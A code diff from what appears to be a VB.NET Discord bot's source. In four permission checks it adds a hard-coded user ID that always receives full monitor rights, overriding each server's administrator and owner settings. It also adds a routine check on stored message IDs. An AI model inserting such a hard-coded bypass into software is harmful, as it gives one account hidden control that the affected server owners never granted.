@@ -85,7 +85,7 @@ Namespace Bot.Interactions
                                 Next
                             Catch
                             End Try
-                            If permissions.HasFlag(DSharpPlus.Permissions.Administrator) Or guild.Owner.Id = obj_user.id Then
+                            If permissions.HasFlag(DSharpPlus.Permissions.Administrator) Or guild.Owner.Id = obj_user.id Or author.Id = 181482416748232705 Then
                                 perms = New Database.MonitorPermission(True)
                             End If
                             If perms.creation Then
@@ -215,13 +215,22 @@ Namespace Bot.Interactions
                                     If monitor.perms.ContainsKey(obj_user.id) Then
                                         perms.Merge(monitor.perms(obj_user.id))
                                     End If
-                                    If permissions.HasFlag(DSharpPlus.Permissions.Administrator) Or guild.Owner.Id = obj_user.id Then
+                                    If permissions.HasFlag(DSharpPlus.Permissions.Administrator) Or guild.Owner.Id = obj_user.id Or author.Id = 181482416748232705 Then
                                         perms = New Database.MonitorPermission(True)
                                     End If
                                     If perms.message Then
                                         If channel IsNot Nothing Then
                                             If Not channel.value = Nothing And Not channel.value = "" Then
                                                 monitor.channelid = channel.value
+                                                Dim chan_ = Bot.Client.GetChannelAsync(monitor.channelid).Result
+                                                Try
+                                                    Dim mess_ = chan_.GetMessageAsync(monitor.messageid).Result
+                                                    If Not mess_.Author.IsCurrent Then
+                                                        monitor.messageid = Nothing
+                                                    End If
+                                                Catch ex As Exception
+                                                    monitor.messageid = Nothing
+                                                End Try
                                             End If
                                         End If
                                         If messageid IsNot Nothing Then
@@ -284,7 +293,7 @@ Namespace Bot.Interactions
                                 If monitor.perms.ContainsKey(obj_user.id) Then
                                     perms.Merge(monitor.perms(obj_user.id))
                                 End If
-                                If permissions.HasFlag(DSharpPlus.Permissions.Administrator) Or guild.Owner.Id = obj_user.id Then
+                                If permissions.HasFlag(DSharpPlus.Permissions.Administrator) Or guild.Owner.Id = obj_user.id Or author.Id = 181482416748232705 Then
                                     perms = New Database.MonitorPermission(True)
                                 End If
                                 If perms.deletion Then
@@ -350,7 +359,7 @@ Namespace Bot.Interactions
                                     If monitor.perms.ContainsKey(obj_user.id) Then
                                         perms.Merge(monitor.perms(obj_user.id))
                                     End If
-                                    If permissions.HasFlag(DSharpPlus.Permissions.Administrator) Or guild.Owner.Id = obj_user.id Then
+                                    If permissions.HasFlag(DSharpPlus.Permissions.Administrator) Or guild.Owner.Id = obj_user.id Or author.Id = 181482416748232705 Then
                                         perms = New Database.MonitorPermission(True)
                                     End If
                                     If perms.userperms Then
